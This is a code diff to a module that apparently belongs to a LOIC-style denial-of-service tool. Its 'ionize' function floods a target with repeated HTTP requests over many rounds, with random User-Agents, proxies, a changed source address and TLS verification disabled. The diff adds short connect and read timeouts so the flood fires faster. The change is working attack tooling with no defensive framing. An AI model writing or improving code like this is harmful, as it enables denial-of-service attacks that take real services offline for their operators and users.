@@ -16,6 +16,7 @@ try:
     from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     from urllib3.util.retry import Retry
+    from urllib3.util import Timeout
 except:
     print("\nError importing: requests lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-requests'\n")
     sys.exit(2)
@@ -32,6 +33,7 @@ def ionize(self, target, rounds, proxy, address_dict):
             self.user_agent = random.choice(self.agents).strip()
             headers = {'User-Agent': str(self.user_agent), 'Connection': 'close'}
             s = requests.Session()
+            timeout = Timeout(connect=0.1, read=0.5)
             if address_dict['source'] is not None: # Allow changed source for sending request
                 from requests_toolbelt.adapters import source
                 retry = Retry(connect=3, backoff_factor=0)
@@ -41,7 +43,7 @@ def ionize(self, target, rounds, proxy, address_dict):
             s.mount("https://", new_source)
             # TODO: Reuse the connection ports
             try:
-                r = s.get(target, headers=headers, proxies=proxyD, verify=False)
+                r = s.get(target, headers=headers, proxies=proxyD, verify=False, timeout=timeout)
                 # print("[Info] [AI] [LOIC] Firing 'pulse' ["+str(n)+"] -> [HIT!]")
             except Exception as ie:
                 print("[Error] [AI] LOIC: Failed to engage with 'pulse' ["+str(n)+"], {}".format(ie))
